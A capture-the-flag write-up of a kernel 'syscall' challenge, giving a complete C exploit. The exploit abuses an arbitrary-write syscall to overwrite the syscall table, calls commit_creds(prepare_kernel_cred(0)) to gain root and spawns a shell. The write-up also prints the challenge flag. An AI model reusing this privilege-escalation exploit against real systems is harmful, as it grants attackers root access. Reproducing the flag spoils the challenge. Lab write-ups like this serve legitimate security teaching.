# Rookiss syscall challenge writeup by agam ^_^

### In the given syscall.c code, we can see that they add a new syscall named sys_upper to the syscall_table. This syscall essentially converts any string of lowercase to uppercase.

```c
static int __init initmodule(void ){
	sct = (unsigned int**)SYS_CALL_TABLE;
	sct[NR_SYS_UNUSED] = sys_upper;
	printk("sys_upper(number : 223) is added\n");
	return 0;
}
```
# INDEED? :D


### By inspecting the syscall code further, we can see that essentially, any user has read/write permissions in the kernel, indicated by a 0x20 offset ☠.
```c
asmlinkage long sys_upper(char *in, char* out) {
	int len = strlen(in);
	int i;
	for(i=0; i<len; i++){
		if(in[i] >= 0x61 && in[i] <= 0x7a){
			out[i] = in[i] - 0x20;
		}
		else{
			out[i] = in[i];
		}
	}
	return 0;
}
```

## On the host, we can see that the kernel module has already been loaded.
```bash
$ lsmod
m 663 0 - Live 0x7f000000 (PO)

$ cat /proc/kallsyms | grep sys_upper
7f000000 t sys_upper    [m]
```

## To gain privileges, we need to change the process privileges and commit them. This can be achieved with this line of code:
```c
commit_creds(prepare_kernel_cred(0))
```

### Where "prepare_kernel_cred" is a func that creates a struct which represents the credentials of a process in the kernel. By passing 0 as an argument, you're essentially asking the kernel to prepare credentials for root. This function allocates and initializes a cred structure with elevated privileges.
```c
struct cred *prepare_kernel_cred(struct task_struct *daemon)
{
	const struct cred *old;
	struct cred *new;

    ...

	old = get_task_cred(daemon);

	*new = *old;
	new->non_rcu = 0;
	atomic_long_set(&new->usage, 1);
	get_uid(new->user); 
	get_user_ns(new->user_ns);
	get_group_info(new->group_info);

    ...
}
``` 

 And **"commit_creds"** is a function that is used to replace the credentials of the current process with the credentials provided as an argument. It effectively changes the process's security context. By passing the result of prepare_kernel_cred(0) as an argument to commit_creds(), you're replacing the current process's credentials with those of the root privileges.

## since there isn't kalsr, Let's check the addresses of those functions inside of /proc/kallsyms:
```bash
$ cat /proc/kallsyms | grep sys_call_table
    >>> 8000e348 T sys_call_table <<<
```
```bash
$ cat /proc/kallsyms | grep prepare_kernel_cred
    >>> 8003f924 T prepare_kernel_cred <<<
    80447f34 r __ksymtab_prepare_kernel_cred
    8044ff8c r __kstrtab_prepare_kernel_cred
```
```bash
$ cat /proc/kallsyms | grep creds
    8003f3d8 T override_creds
    8003f44c T prepare_creds
    8003f51c T revert_creds
    >>> 8003f56c T commit_creds <<<
```

# Let's make the exploit poc!
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/syscall.h>

// 8000e348 T sys_call_table
#define SYS_CALL_TABLE       ((void**)0x8000e348) // 0x [80] [00] [e3] [48] -> 
#define COMMIT_CREDS         0x8003f56c // 0x [80] [03] [f5] [6c] -> "\x8c\xf5\x03\x80";
#define PERPARE_KERNEL_CREDS 0x8003f924 // 0x [80] [03] [f9] [24] -> "\x24\xf9\x03\x80";

#define SYS_UPPER            223


long get_root_privlleges_process(void* (*prepare)(void*), int (*commit)(void*) )
{
    return commit(prepare(NULL));
}

int main() 
{

    unsigned int** sct;
    sct = (unsigned int**)SYS_CALL_TABLE;
    printf("[+] get_root_privlleges_process func addr: %p\n", get_root_privlleges_process);

    // store pointer to get_root_privlleges_process
    uint8_t sys_root_ptr[sizeof(void*) + 1] = {0};
    *(void**)sys_root_ptr = (void*)get_root_privlleges_process;

    printf("[+] sys_root_ptr: %p\n", sys_root_ptr);
    printf("[+] sys_upper addr: %p\n", SYS_CALL_TABLE + SYS_UPPER); 

    // override SYS_UPPER syscall functionality to our get_root_privlleges_process func
    syscall(SYS_UPPER, sys_root_ptr, &sct[SYS_UPPER]);
    puts("changed sys_upper to sys_root_ptr :D");
    
    void *commit  = (void*)COMMIT_CREDS;
    void *prepare = (void*)PERPARE_KERNEL_CREDS;

    printf("[+] commit: %p\n[+] prepare: %p\n", commit, prepare);
    // call our new syscall with the memory address of commit and prepare
    syscall(SYS_UPPER, prepare, commit);

    //      goal
    // ----------------
    system("/bin/sh");

    return 0;
}
```
```bash
/tmp $ cat /root/flag
Congratz!! addr_limit looks quite IMPORTANT now... huh?
```
# The flag is : Congratz!! addr_limit looks quite IMPORTANT now... huh?
